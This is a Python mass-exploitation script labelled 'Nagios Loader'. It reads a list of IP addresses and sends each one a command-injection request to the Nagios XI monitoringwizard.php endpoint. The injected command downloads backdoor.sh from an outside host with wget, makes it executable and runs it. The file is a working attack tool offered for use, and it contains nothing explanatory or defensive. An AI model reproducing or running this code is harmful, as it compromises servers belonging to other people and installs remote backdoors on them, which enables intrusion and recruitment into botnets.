import requests, sys, threading, time
from colorama import Fore, init

cmd = 'cd /tmp || cd /run || cd / || cd /var/run || cd /var || cd /root || cd /mnt; wget http://1.3.3.7/backdoor.sh; chmod 777 backdoor.sh; sh backdoor.sh'
vuln = f'/nagiosxi/config/monitoringwizard.php?update=1&nsp=e2401df06a3892ba612df20e1ce2f559d7647c4b5fcba7f64c23c0ea9df1564f&nextstep=4&wizard=digitalocean&no_ssl_verify=1&ip_address=127.0.0.1;{cmd};&port=5693&token=123&submitButton2='

if len(sys.argv) != 2:
    print(f'{Fore.RED}Usage : python {sys.argv[0]} list.txt{Fore.RESET}')
    sys.exit()
else:
    lines = open(sys.argv[1], 'r').readlines()

class hax(threading.Thread):
        def __init__ (self, ip):
            threading.Thread.__init__(self)
            self.ip = str(ip).rstrip('\n')
            self.x = str(x).rstrip('\n')
        def run(self):
            try:
                print(f'[{Fore.RED}Nagios Loader{Fore.RESET}] {Fore.GREEN}Loading {Fore.RESET}: {Fore.RED}{self.ip}{Fore.RESET}')
                url = f'http://{self.ip}{vuln}'
                requests.get(url, timeout=3)
                print(url)
            except:
                pass

for x in lines:
    try:
        n = hax(x)
        n.start()
        time.sleep(0.05)
    except KeyboardInterrupt:
        print(f'[{Fore.RED}CTRL-C{Fore.RESET}] {Fore.RED}Detected! Closing!{Fore.RESET}')
        exit()
    except:
        pass # BY 0x00
